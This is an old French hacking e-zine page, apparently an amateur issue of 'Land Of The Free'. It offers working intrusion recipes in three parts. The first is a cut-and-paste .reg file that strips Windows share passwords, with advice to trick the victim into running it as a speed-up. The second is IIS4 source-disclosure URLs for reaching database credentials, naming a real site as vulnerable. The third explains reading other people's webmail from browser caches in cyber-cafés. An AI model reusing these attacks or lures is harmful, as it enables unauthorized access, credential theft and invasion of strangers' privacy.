<html>
<head>
<title>Land Of The Free #3</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body bgcolor="#000000" text="#FFFFFF" link="#FF0000" vlink="#FF0000" alink="#FF0000">
<p><font face="Verdana, Arial, Helvetica, sans-serif">**********************************************<br>
  <font face="Verdana, Arial, Helvetica, sans-serif"> **** Supprimer le password du partage de fichier</font> **** <br>
  <font face="Verdana, Arial, Helvetica, sans-serif">**********************************************</font></p>
<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Je vais vous parler aujourd'hui 
  des fichiers reg qui peuvent se r&eacute;v&eacute;ler tr&eacute;s utile pour p&eacute;n&eacute;trer un PC. Surtout quand on utilse la NBTSTAT, et quand on tombe pour une fois sur un PC qui a un partage 
  de fichiers et bein l&agrave; on est confronter &agrave; un password.</p>
<p>Donc avant de supprimer 
  le mot de passe, je vais vous dire ce que sont ces fichiers reg.</p>

  Donc les fichiers reg sont des fichiers qui permettent d'aporter des modifications &agrave; la base de registre, ou est stok&eacute; pratiquement toute votre configuration windows.<br>
  
<p>La syntaxe d'un fichier reg est tr&egrave;s facile, &agrave; savoir:</p>
  REGEDIT4<br>
  [Le chemin ou se trouve les valeurs chaine et binaires s&eacute;par&eacute; par des "\"]<br>
  "le nom de la valeur chaine"="sa valeur"<br>
  "le nom de la dword ou binaire"=dword ou hex:sa valeur<br>
  Il faut juste respecter les guillemets.<br>
<p>Bon maintenant on peut commencer notre &quot;hack&quot;.</p>
Quand vous partagez vos fichiers, il y a plusieurs choses qui change dans votre base de registre, et c'est a cette emplacement:<br>
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\(lettre du disque dur partag&eacute;)<br>
que tous les mots de passes du partage sont stok&eacute;s, et plus pricis&eacute;ment:<br>
c'est la valeur binaire: "Parm2enc" qui contient le mot de passe de la lecture seule.<br>
et "Parm1enc" qui contient le mot de passe de l'acc&egrave;s complet.<br>
<p>Maintenant il ne nous reste plus qu'a faire notre fichier reg, pour le faire allez &agrave;:<br>
" HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\C "<br>
et l&agrave; vous cliquez sur la cl&eacute; "C" apr&egrave;s sur "Registre" (dans le menu) puis sur "Exporter un fichier du registre", c'est l&agrave; que vous lui donnez le nom que vous disirez.<br>
Si vous n'avez pas un partage de fichier copier directement ce passage et renommer le en "n'inmporte_quoi.reg"</p>
<p>------------Coupez ici----------------------------<br><br>
REGEDIT4<br><br>

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C]<br>
"Flags"=dword:00000102<br>
"Type"=dword:00000000<br>
"Path"="C:\\"<br>
"Parm2enc"=hex:<br>
"Parm1enc"=hex:<br>
"Remark"=""<br><br>

-----------Coupez ici-----------------------------</p>
Je tiens &agrave; vous signalez que ce fichier reg sert &agrave; supprimer le mot de passe, si vous voulez changer le mot de passe je pense que vous devez savoir comment faire.<br><br>
Quelques remarques:<br>
-Vous n'avez qu'a donner le fichier reg au mec en lui disons que ça va accélérer sa connexion.<br>
-Si vous n'arrivez pas a connaitre les équivalence des caractères (lettres ou chiffres) en hexadécimale vous n'avez qu'a me les demander, je vous les envérais ou il seront publier dans le prochain (s'il y a un prochain). 
<br><br><br>
</font>
<font face="Verdana, Arial, Helvetica, sans-serif" size="3">
**************************<br>
****&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Failles ASP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;****<br>
**************************<br>
</font>
<font face="Verdana, Arial, Helvetica, sans-serif" size="2">
<p>
L'ASP (Active Server Pages) est un langage de script d&eacute;velop&eacute; par Microsoft, mais comme toute chose faite par Microsoft elle souffre de nombreux bugs.<br>
Ces bugs nous servirons par exemple &agrave; voir le code source d'une page asp (.asp), ou du fichier "global.asa"</p>
<p>Le code source d'une page ASP<br>
°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°<br>
Avoir le code source de certaine pages ASP peut se r&eacute;v&eacute;ler tr&eacute;s utile, car il existe des formulaires qui nous envoies vers une page ASP, donc si on se procure le code source de cette page, on peut connaitre l'emplacement de la base de donn&eacute;e ou sont stoker par exemple les logins et passwords d'un service mailing par exemple.<br>
Donc si l'emplacement de la page ASP est:<br> http://www.nomdusite.com/lapage.asp <br>Et bein il faudra ajouter "::$DATA" &agrave; la fin de l'URL donc ça devient:<br> http://www.nomdusite.com/lapage.asp::$DATA<br>
Sinon il y a une autre solution c'est de saisir l'adresse suivante:<br>
http://www.nomdusite.com/null.htw?CiWebHitsFile=/lapage%20&CiRestriction=none&CiHiliteType=Full</p>
<p>Le code source du fichier global.asa<br>
°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°<br>
Mais parfois le code source d'une page ASP ne fait pas r&eacute;f&eacute;rence &agrave; une base de donn&eacute;e, mais &agrave; un DSN (Data Source Name), c'est le nom virtuel de la base de donn&eacute;e.<br>
Donc le fichier global.asa peut vous aider (je dis bien "peut vous aider") &agrave; connaitre le nom (donc l'emplacement), le user et le login de la base de donn&eacute;e; pour avoir le code source de ce fichier il faut saisir l'adresse suivante:<br>
http://www.nomdusite.com/global.asa+.htr<br>Apr&egrave;s ça vous afficher la source.</p>
Il faut savoir que c'est le serveur IIS4 de Microsoft (te m'&eacute;tonne!!) qui souffre de cette faille, mais Microsoft a propos&eacute; un patch pour corriger cette erreur.<br>Mais j'ai comme même r&eacute;ussi &agrave; trouver un site qui souffrer encore de cette faille c'est le site de CERIST, mais l'admin n'a pas trainer (3 mois ;-) pour supprimer la faille.<br>
N.B: Si il y a des gens qui connaisse CERIST, je leur demande de bien vouloir me contacter.</font>
<br><br>
<p><font face="Verdana, Arial, Helvetica, sans-serif">
*******************************<br>
****&nbsp;&nbsp;Lire les mails des autres&nbsp;&nbsp;****<br>
*******************************<br></font>
<font face="Verdana, Arial, Helvetica, sans-serif" size="2">
<p>
Vous devez certainement connaitre cette m&eacute;thode, mais il y a aussi des personnes qui ne la connaisse pas.<br>
Comme vous le savez, toutes les pages web que vous consulter sont stok&eacute;s par defaut dans le dossier: C:\WINDOWS\Temporary Internet Files<br>
Donc tous les mails que vous lis&eacute; sont stok&eacute;s aussi dans ce même dossier, mais pas au format html (je parle de l'extension), mais vous pouvez comme même les ouvrir avec MSIE.<br>
Mais il y a un hic, car vous ne pouvez que lire les mails consult&eacute;s, mais vous ne pouvais pas par exemple envoyer un mail ou acceder &agrave; n'importe quel autre chose non consult&eacute;.<br>
Cette m&eacute;thode est utile dans les cyber-caf&eacute;s, ou les personnes ne supprime pas syst&eacute;matiquement le contenu de se dossier.</p>
<br><br><center>Fait par <a href="mailto:OS4M4CKERS@hotmail.com">OS4M4CKERS</a>:<br>
www.DarkWebZONE.fr.st (Under construction)</center>

</body>
</html>

